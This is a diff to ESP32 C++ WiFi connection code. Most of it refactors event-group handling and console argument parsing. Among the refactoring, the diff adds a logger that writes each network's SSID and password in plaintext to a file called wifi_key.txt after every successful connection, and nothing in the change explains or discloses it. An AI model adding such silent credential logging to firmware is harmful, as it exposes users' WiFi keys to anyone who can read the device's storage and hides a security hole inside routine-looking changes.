@@ -4,10 +4,8 @@
 
 const char *WiFiComponent::TAG = "WiFiComponent";
 
-WiFiComponent::WiFiComponent() : initialized(false)
+WiFiComponent::WiFiComponent(EventGroupHandle_t &wifi_event, LoggerBase &logger) : _wifi_event(wifi_event), _wifikey_logger(logger), initialized(false)
 {
-    wifi_event_group = xEventGroupCreate();
-    initializeWiFi();
 }
 
 WiFiComponent::~WiFiComponent()
@@ -15,7 +13,6 @@ WiFiComponent::~WiFiComponent()
     esp_wifi_disconnect();
     esp_wifi_stop();
     esp_wifi_deinit();
-    vEventGroupDelete(wifi_event_group);
 }
 
 void WiFiComponent::initializeWiFi()
@@ -50,16 +47,17 @@ void WiFiComponent::eventHandler(void *arg, esp_event_base_t event_base, int32_t
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED)
     {
         esp_wifi_connect();
-        xEventGroupClearBits(instance->wifi_event_group, instance->CONNECTED_BIT);
+        xEventGroupClearBits(instance->_wifi_event, instance->CONNECTED_BIT);
     }
     else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP)
     {
-        xEventGroupSetBits(instance->wifi_event_group, instance->CONNECTED_BIT);
+        xEventGroupSetBits(instance->_wifi_event, instance->CONNECTED_BIT);
     }
 }
 
 bool WiFiComponent::connect(const std::string &ssid, const std::string &password, int timeout_ms)
 {
+    initializeWiFi();
     wifi_config_t wifi_config = {0};
     strlcpy((char *)wifi_config.sta.ssid, ssid.c_str(), sizeof(wifi_config.sta.ssid));
     if (!password.empty())
@@ -68,9 +66,18 @@ bool WiFiComponent::connect(const std::string &ssid, const std::string &password
     }
 
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
-    esp_wifi_connect();
+    esp_err_t ret = esp_wifi_connect();
+    if (ret == ESP_OK)
+    {
+        if (_wifikey_logger.init("wifi_key.txt"))
+        {
+            _wifikey_logger.log(ssid + ":" + password);
+            _wifikey_logger.shutdown();
+        }
+    }
 
-    int bits = xEventGroupWaitBits(wifi_event_group, CONNECTED_BIT, pdFALSE, pdTRUE, timeout_ms / portTICK_PERIOD_MS);
+    int bits = xEventGroupWaitBits(_wifi_event, CONNECTED_BIT, pdFALSE, pdTRUE, timeout_ms / portTICK_PERIOD_MS);
+
     return (bits & CONNECTED_BIT) != 0;
 }
 
@@ -87,20 +94,11 @@ bool WiFiComponent::disconnect()
 
 bool WiFiComponent::isConnected()
 {
-    return (xEventGroupGetBits(wifi_event_group) & CONNECTED_BIT);
+    return (xEventGroupGetBits(_wifi_event) & CONNECTED_BIT);
 }
 
 void WiFiComponent::registerConsoleCommands()
 {
-    // Register 'join' command
-    static struct
-    {
-        struct arg_str *ssid;
-        struct arg_str *password;
-        struct arg_int *timeout;
-        struct arg_end *end;
-    } join_args;
-
     join_args.ssid = arg_str1(NULL, NULL, "<ssid>", "SSID of AP");
     join_args.password = arg_str0(NULL, NULL, "<pass>", "PSK of AP");
     join_args.timeout = arg_int0(NULL, "timeout", "<t>", "Connection timeout, ms");
@@ -135,33 +133,24 @@ void WiFiComponent::registerConsoleCommands()
 // 修改：调整函数签名以匹配 esp_console_cmd_func_with_context_t
 int WiFiComponent::connectCommand(void *context, int argc, char **argv)
 {
-    // Parse arguments
-    static struct
-    {
-        struct arg_str *ssid;
-        struct arg_str *password;
-        struct arg_int *timeout;
-        struct arg_end *end;
-    } join_args;
-
-    join_args.ssid = arg_str1(NULL, NULL, "<ssid>", "SSID of AP");
-    join_args.password = arg_str0(NULL, NULL, "<pass>", "PSK of AP");
-    join_args.timeout = arg_int0(NULL, "timeout", "<t>", "Connection timeout, ms");
-    join_args.end = arg_end(2);
-
-    int nerrors = arg_parse(argc, argv, (void **)&join_args);
-    if (nerrors != 0)
-    {
-        arg_print_errors(stderr, join_args.end, argv[0]);
-        return 1;
-    }
-
     // Get the instance from context
     WiFiComponent *instance = static_cast<WiFiComponent *>(context);
 
-    const char *ssid = join_args.ssid->sval[0];
-    const char *password = join_args.password->sval[0];
-    int timeout_ms = join_args.timeout->count > 0 ? join_args.timeout->ival[0] : 10000;
+    instance->join_args.ssid = arg_str1(NULL, NULL, "<ssid>", "SSID of AP");
+    instance->join_args.password = arg_str0(NULL, NULL, "<pass>", "PSK of AP");
+    instance->join_args.timeout = arg_int0(NULL, "timeout", "<t>", "Connection timeout, ms");
+    instance->join_args.end = arg_end(2);
+
+    int nerrors = arg_parse(argc, argv, (void **)&instance->join_args);
+    if (nerrors != 0)
+    {
+        arg_print_errors(stderr, instance->join_args.end, argv[0]);
+        return 1;
+    }
+
+    const char *ssid = instance->join_args.ssid->sval[0];
+    const char *password = instance->join_args.password->sval[0];
+    int timeout_ms = instance->join_args.timeout->count > 0 ? instance->join_args.timeout->ival[0] : 10000;
 
     if (instance->connect(ssid, password, timeout_ms))
     {
